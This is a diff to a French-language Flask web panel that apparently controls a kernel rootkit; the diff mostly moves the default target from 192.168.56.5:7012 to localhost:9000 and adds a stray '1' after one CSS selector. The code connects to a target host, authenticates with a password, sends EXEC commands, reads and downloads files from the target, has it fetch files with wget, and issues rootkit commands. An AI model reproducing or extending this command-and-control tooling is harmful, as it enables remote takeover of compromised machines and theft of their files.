@@ -393,7 +393,7 @@ def main_interface():
                 display: none;
             }
             
-            .upload-form input[type=file] {
+            .upload-form input[type=file] {1
                 width: 0.1px;
                 height: 0.1px;
                 opacity: 0;
@@ -478,7 +478,7 @@ def main_interface():
         <div class="terminal-body">
             <div class="notifications-panel">
                 <div style="color: #f00; font-weight: bold; margin-bottom: 5px;">
-                    🚨 ALERTES ROOTKIT (<span id="notification-count">0</span>)
+                   🚨 🚨  🚨 ALERTES ROOTKIT (<span id="notification-count">0</span>) 🚨 🚨 🚨 
                 </div>
                 <div id="notifications-list" style="max-height: 100px; overflow-y: auto; background-color: #111; border: 1px solid #f00; padding: 5px;">
                     <div style="color: #555;">En attente d'alertes...</div>
@@ -504,8 +504,8 @@ def main_interface():
             </div>
             
             <div class="config-panel">
-                <input type="text" id="ip" placeholder="Adresse IP" value="192.168.56.5">
-                <input type="text" id="port" placeholder="Port" value="7012">
+                <input type="text" id="ip" placeholder="Adresse IP" value="localhost">
+                <input type="text" id="port" placeholder="Port" value="9000">
                 <button onclick="testFunction()">Connecter</button>
             </div>
             
@@ -550,7 +550,7 @@ def main_interface():
         <script>
             let modeActuel = 'commande';
             let connecte = false;
-            let port7012Status = false;
+            let port9000Status = false;
             let lastNotificationCheck = 0;
 
             function actualiserNotifications() {
@@ -592,36 +592,36 @@ def main_interface():
                 const now = new Date();
                 let timeText = now.toLocaleTimeString();
                 
-                if (port7012Status) {
-                    timeText += " | Port 7012: <span style='color: #0f0;'>OUVERT</span>";
+                if (port9000Status) {
+                    timeText += " | Port 9000: <span style='color: #0f0;'>OUVERT</span>";
                 } else {
-                    timeText += " | Port 7012: <span style='color: #f00;'>FERMÉ</span>";
+                    timeText += " | Port 9000: <span style='color: #f00;'>FERMÉ</span>";
                 }
                 
                 document.getElementById('time').innerHTML = timeText;
             }
             
-            function verifierPort7012() {
+            function verifierPort9000() {
                 const ip = document.getElementById('ip').value;
                 
                 fetch('/api/verifier_port', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ip: ip, port: 7012})
+                    body: JSON.stringify({ip: ip, port: 9000})
                 })
                 .then(response => response.json())
                 .then(data => {
-                    port7012Status = data.ouvert;
+                    port9000Status = data.ouvert;
                     updateClock();
                 })
                 .catch(error => {
-                    port7012Status = false;
+                    port9000Status = false;
                     updateClock();
                 });
             }
             
-            setInterval(verifierPort7012, 5000);
-            setTimeout(verifierPort7012, 1000);
+            setInterval(verifierPort9000, 5000);
+            setTimeout(verifierPort9000, 1000);
             setInterval(updateClock, 1000);
             updateClock();
             
@@ -808,7 +808,7 @@ def main_interface():
                             afficherResultat(`Upload via WGET: ${file.name}\\nDestination: ${targetPath}\\n\\nEtape 1/2: Fichier stocké sur serveur\\nURL: ${data.download_url}\\n\\nEtape 2/2: Téléchargement via wget...`);
                             
                             const ip = document.getElementById('ip').value;
-                            const port = document.getElementById('port').value || '7012';
+                            const port = document.getElementById('port').value || '9000';
                             
                             fetch('/api/wget_download', {
                                 method: 'POST',
@@ -849,7 +849,7 @@ def main_interface():
                 if (!filePath) return;
                 
                 const ip = document.getElementById('ip').value;
-                const port = document.getElementById('port').value || '7012';
+                const port = document.getElementById('port').value || '9000';
                 
                 afficherResultat(`Download: ${filePath}\\nVérification et téléchargement...`);
                 
@@ -884,7 +884,7 @@ def main_interface():
             
             function testFichiers() {
                 const ip = document.getElementById('ip').value;
-                const port = document.getElementById('port').value || '7012';
+                const port = document.getElementById('port').value || '9000';
                 
                 fetch('/api/commande_rootkit', {
                     method: 'POST',
@@ -943,7 +943,7 @@ def receive_notification():
 def verifier_port():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 7012))
+    port = int(data.get('port', 9000))
     
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -962,7 +962,7 @@ def verifier_port():
 def authenticate():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 7012))
+    port = int(data.get('port', 9000))
     password = data.get('password')
     
     # Tester l'authentification directement avec le kernel
@@ -971,14 +971,12 @@ def authenticate():
         s.settimeout(10)
         s.connect((ip, port))
         
-        # Attendre AUTH_REQUIRED
+    
         try:
             initial_response = s.recv(1024).decode()
             if initial_response == "AUTH_REQUIRED":
-                # Envoyer le mot de passe saisi par l'utilisateur
                 s.send(f"AUTH {password}".encode())
-                
-                # Recevoir la réponse
+
                 auth_response = s.recv(1024).decode()
                 s.close()
                 
@@ -1016,7 +1014,7 @@ def get_notifications():
 def executer():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 7012))
+    port = int(data.get('port', 9000))
     commande = data.get('commande')
     
     resultat = envoyer_commande(ip, port, "EXEC " + commande)
@@ -1026,7 +1024,7 @@ def executer():
 def lire():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 7012))
+    port = int(data.get('port', 9000))
     chemin = data.get('chemin')
     
     resultat = envoyer_commande(ip, port, "LIRE " + chemin)
@@ -1076,7 +1074,7 @@ def download_file_serve(filename):
 def download_file_from_target():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 7012))
+    port = int(data.get('port', 9000))
     file_path = data.get('file_path')
     
     if not file_path:
@@ -1157,7 +1155,7 @@ def download_file_from_target():
 def wget_download():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 7012))
+    port = int(data.get('port', 9000))
     download_url = data.get('download_url')
     target_path = data.get('target_path', '/tmp/')
     method = data.get('method', 'wget')
@@ -1182,7 +1180,7 @@ def wget_download():
 def commande_rootkit():
     data = request.json
     ip = data.get('ip')
-    port = int(data.get('port', 7012))
+    port = int(data.get('port', 9000))
     commande = data.get('commande')
     
     try:
@@ -1208,7 +1206,7 @@ def commande_rootkit():
         return jsonify({"resultat": f"Erreur: {str(e)}"})
 
 def envoyer_commande(ip, port, message):
-    # Utiliser les paramètres de la session si pas fournis
+    
     if not ip or not port:
         ip = session.get('target_ip', ip)
         port = session.get('target_port', port)
@@ -1218,12 +1216,12 @@ def envoyer_commande(ip, port, message):
         s.settimeout(15)
         s.connect((ip, int(port)))
         
-        # Vérifier si une authentification est requise
+        
         s.settimeout(5)
         try:
             initial_response = s.recv(1024).decode()
             if initial_response == "AUTH_REQUIRED":
-                # Utiliser le mot de passe de la session
+                
                 password = session.get('user_password', '')
                 s.send(f"AUTH {password}".encode())
                 
